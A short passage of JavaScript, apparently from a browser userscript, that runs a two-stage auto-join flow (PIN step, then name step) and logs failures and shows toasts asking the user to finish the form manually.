            if (err) logJoin('err', `Blocked: ${err}`);
            else logJoin('warn', 'Stage 1 failed — leaving form to user.');
            try { BP.toast('warn', 'Auto-join', 'PIN step failed — finish manually.'); } catch {}
            return;
          }
        }

        // Stage 2
        const stage2Ok = await runStage2();
        if (!stage2Ok){
          logJoin('warn', 'Stage 2 failed — leaving form to user.');
          try { BP.toast('warn', 'Auto-join', 'Name step failed — finish manually.'); } catch {}
          return;
        }

        // Make sure the panel is visible now that we're in
        try { document.body.dataset.panelOpen = 'true'; } catch {}
      } catch (e){
        logJoin('err', `Auto-join gave up: ${e.message}`);
        try { BP.toast('warn', 'Auto-join', 'Finish the form manually.'); } catch {}
      }
    })();
  })();
